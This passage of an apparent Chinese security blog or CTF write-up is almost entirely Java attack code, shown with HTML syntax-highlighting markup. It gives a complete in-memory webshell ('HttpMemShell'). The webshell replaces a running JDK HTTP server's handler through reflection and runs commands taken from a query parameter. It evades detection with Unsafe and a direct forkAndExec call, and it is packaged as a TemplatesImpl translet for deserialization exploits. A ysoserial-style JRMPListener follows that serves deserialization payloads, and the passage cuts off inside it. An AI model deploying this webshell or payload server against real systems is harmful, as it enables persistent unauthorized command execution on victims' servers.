class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.boogipop.Solutions;<br><br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpMemShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange httpExchange)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> httpExchange.getRequestURI().getQuery();<br>        String[] split = query.split(<span class="hljs-string">&quot;=&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SUCCESS&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">if</span> (split[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;shell&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> split[<span class="hljs-number">1</span>];<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                inputStream = execCmd(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span> flag=-<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">while</span>((flag=inputStream.read(bytes))!=-<span class="hljs-number">1</span>)&#123;<br>                byteArrayOutputStream.write(bytes,<span class="hljs-number">0</span>,flag);<br>            &#125;<br>            response += byteArrayOutputStream.toString();<br>            byteArrayOutputStream.close();<br>        &#125;<br>        httpExchange.sendResponseHeaders(<span class="hljs-number">200</span>,response.length());<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> httpExchange.getResponseBody();<br>        outputStream.write(response.getBytes());<br>        outputStream.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpMemShell</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//public和default的区别 public对所有类可见;default对同一个包内可见;templatlmpl默认实例化使用public memshell()</span><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">threadsFeld</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);<br>            threadsFeld.setAccessible(<span class="hljs-literal">true</span>);<br>            Thread[] threads = (Thread[])threadsFeld.get(threadGroup);<br>            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> threads[<span class="hljs-number">1</span>];<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">targetField</span> <span class="hljs-operator">=</span> thread.getClass().getDeclaredField(<span class="hljs-string">&quot;target&quot;</span>);<br>            targetField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> targetField.get(thread);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">this$0Field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;this$0&quot;</span>);<br>            <span class="hljs-built_in">this</span>$0Field.setAccessible(<span class="hljs-literal">true</span>);<br>            object = <span class="hljs-built_in">this</span>$0Field.get(object);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">contextsField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;contexts&quot;</span>);<br>            contextsField.setAccessible(<span class="hljs-literal">true</span>);<br>            object = contextsField.get(object);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">listField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;list&quot;</span>);<br>            listField.setAccessible(<span class="hljs-literal">true</span>);<br>            java.util.<span class="hljs-type">LinkedList</span> <span class="hljs-variable">linkedList</span> <span class="hljs-operator">=</span> (java.util.LinkedList)listField.get(object);<br>            object = linkedList.get(<span class="hljs-number">0</span>);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>            handlerField.set(object,<span class="hljs-built_in">this</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception exception)&#123;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InputStream <span class="hljs-title function_">execCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            String[] command=cmd.split(<span class="hljs-string">&quot; &quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>);<br><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>                processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<br>            <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[command.length - <span class="hljs-number">1</span>][];<br>            <span class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>                args[i] = command[i + <span class="hljs-number">1</span>].getBytes();<br>                size += args[i].length;<br>            &#125;<br><br>            <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>            <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>                System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>                i += arg.length + <span class="hljs-number">1</span>;<br>                <span class="hljs-comment">// No need to write NUL bytes explicitly</span><br>            &#125;<br>            <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);<br>            launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);<br>            helperpathField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);<br>            <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);<br><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                    <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,<br>                    <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class<br>            &#125;);<br><br>            forkMethod.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">// 设置访问权限</span><br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                    ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(command[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                    <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>            &#125;);<br><br>            <span class="hljs-comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);<br>            initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            initStreamsMethod.invoke(processObject, std_fds);<br><br>            <span class="hljs-comment">// 获取本地执行结果的输入流</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>            getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);<br>            <span class="hljs-keyword">return</span> in;<br>        &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                result, <span class="hljs-number">0</span>,<br>                bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>JRMPListener.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.BufferedOutputStream;<br><span class="hljs-keyword">import</span> java.io.DataInputStream;<br><span class="hljs-keyword">import</span> java.io.DataOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectStreamClass;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.net.*;<br><span class="hljs-keyword">import</span> java.rmi.MarshalException;<br><span class="hljs-keyword">import</span> java.rmi.server.ObjID;<br><span class="hljs-keyword">import</span> java.rmi.server.UID;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> sun.rmi.transport.TransportConstants;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Generic JRMP listener</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Opens up an JRMP listener that will deliver the specified payload to any</span><br><span class="hljs-comment"> * client connecting to it and making a call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> mbechler</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@SuppressWarnings</span> ( &#123;<br>        <span class="hljs-string">&quot;restriction&quot;</span><br>&#125; )<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> port;<br>    <span class="hljs-keyword">private</span> Object payloadObject;<br>    <span class="hljs-keyword">private</span> ServerSocket ss;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">waitLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> exit;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> hadConnection;<br>    <span class="hljs-keyword">private</span> URL classpathUrl;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span> <span class="hljs-params">( <span class="hljs-type">int</span> port, Object payloadObject )</span> <span class="hljs-keyword">throws</span> NumberFormatException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = payloadObject;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span> <span class="hljs-params">(<span class="hljs-type">int</span> port, String className, URL classpathUrl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = makeDummyObject(className);<br>        <span class="hljs-built_in">this</span>.classpathUrl = classpathUrl;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">waitFor</span> <span class="hljs-params">( <span class="hljs-type">int</span> i )</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.hadConnection ) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            System.err.println(<span class="hljs-string">&quot;Waiting for connection&quot;</span>);<br>            <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>                <span class="hljs-built_in">this</span>.waitLock.wait(i);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hadConnection;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.exit = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.ss.close();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( IOException e ) &#123;&#125;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notify();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">if</span> ( args.length &lt; <span class="hljs-number">1</span> ) &#123;<br>            System.err.println(JRMPListener.class.getName() + <span class="hljs-string">&quot; &lt;port&gt;&quot;</span>);<br>            System.exit(-<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> 